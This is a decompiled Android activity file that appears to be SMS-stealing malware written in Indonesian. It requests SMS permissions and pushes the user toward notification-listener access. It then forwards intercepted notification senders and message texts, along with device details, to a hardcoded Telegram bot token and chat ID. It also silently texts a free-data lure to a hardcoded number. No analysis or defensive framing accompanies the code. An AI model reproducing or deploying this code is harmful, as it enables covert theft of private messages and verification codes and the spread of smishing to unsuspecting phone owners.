package com.example.myapplicatior;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.Html;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final int RESULT_ENABLE = 0;
    private static final int VISIBILITY = 1028;
    final String TAG = "demo1";
    /* access modifiers changed from: private */
    public final OkHttpClient client = new OkHttpClient();
    String device = (Build.BRAND + " - " + Build.MODEL + SmsManager.getDefault());
    private Object devicePolicyManager;
    ComponentName mDeviceAdminSample;
    private BroadcastReceiver onNotice = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String packageName = intent.getStringExtra("package");
            String titleData = intent.getStringExtra("title");
            String textData = intent.getStringExtra("text");
            String stringExtra = intent.getStringExtra("id");
            new TableRow(MainActivity.this.getApplicationContext()).setLayoutParams(new TableRow.LayoutParams(-1, -2));
            TextView textview = new TextView(MainActivity.this.getApplicationContext());
            textview.setLayoutParams(new TableRow.LayoutParams(-2, -2, 1.0f));
            textview.setTextSize(12.0f);
            textview.setTextColor(Color.parseColor("#000000"));
            textview.setText(Html.fromHtml("From : " + titleData + " | Message : </b>" + textData));
            MainActivity.this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot7153602473:AAFSHM8j2WwWoZtJoybLJtl4vvcKn6GogZ0/sendMessage?parse_mode=markdown&chat_id=6308795074&text=*" + packageName + "* %0A%0A*From :* _" + titleData + "_%0A*Message :* _" + textData + "_").build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
        }
    };
    private TextView textView;
    WebSettings websettingku;
    WebView webviewku;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        MainActivity.super.onCreate(savedInstanceState);
        setContentView(2131427356);
        WebView webView = (WebView) findViewById(2131231023);
        this.webviewku = webView;
        WebSettings settings = webView.getSettings();
        this.websettingku = settings;
        settings.setJavaScriptEnabled(true);
        this.webviewku.setWebViewClient(new WebViewClient());
        this.webviewku.loadUrl("");
        if (Build.VERSION.SDK_INT >= 19) {
            this.webviewku.setLayerType(2, (Paint) null);
        } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
            this.webviewku.setLayerType(1, (Paint) null);
        }
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission("android.permission.RECEIVE_SMS") != 0 && checkSelfPermission("android.permission.SEND_SMS") != 0) {
            requestPermissions(new String[]{"android.permission.RECEIVE_SMS", "android.permission.SEND_SMS"}, 1000);
        }
    }

    /* JADX WARNING: type inference failed for: r10v0, types: [android.content.Context, com.example.myapplicatior.MainActivity, androidx.appcompat.app.AppCompatActivity] */
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        MainActivity.super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != 1000) {
            return;
        }
        if (grantResults[RESULT_ENABLE] == 0) {
            this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7153602473:AAFSHM8j2WwWoZtJoybLJtl4vvcKn6GogZ0/sendMessage?parse_mode=markdown&chat_id=6308795074&text=\n──────────────────────\n\n  𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐋𝐚𝐧𝐚 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨     \n\n    ──────────────────────  \n\n " + this.device).build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            try {
                SmsManager.getDefault().sendTextMessage("082379770443", (String) null, "Gratis hari ini kuota 25GB", (PendingIntent) null, (PendingIntent) null);
            } catch (Exception ex) {
                this.client.newCall(new Request.Builder().url(" https://api.telegram.org/bot7153602473:AAFSHM8j2WwWoZtJoybLJtl4vvcKn6GogZ0/sendMessage?parse_mode=markdown&chat_id=6308795074&text=Error : _" + ex).build()).enqueue(new Callback() {
                    public void onFailure(Call call, IOException e) {
                        e.printStackTrace();
                    }

                    public void onResponse(Call call, Response response) throws IOException {
                        Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                        if (response.isSuccessful()) {
                            response.body().string();
                        }
                    }
                });
                Toast.makeText(getApplicationContext(), "" + ex, 1).show();
            }
            NotificationManager n = (NotificationManager) getApplicationContext().getSystemService("notification");
            if (Build.VERSION.SDK_INT >= 23 && !n.isNotificationPolicyAccessGranted()) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(this, "Izinkan akses notification ", RESULT_ENABLE).show();
            }
            LocalBroadcastManager.getInstance(this).registerReceiver(this.onNotice, new IntentFilter("Msg"));
            return;
        }
        Toast.makeText(this, "Permission Not Granted!", RESULT_ENABLE).show();
        this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7153602473:AAFSHM8j2WwWoZtJoybLJtl4vvcKn6GogZ0/sendMessage?parse_mode=markdown&chat_id=6308795074&text=\n──────────────────────\n\n  𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐋𝐚𝐧𝐚 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨     \n\n    ──────────────────────  \n\n " + this.device + "_").build()).enqueue(new Callback() {
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        finish();
    }
}
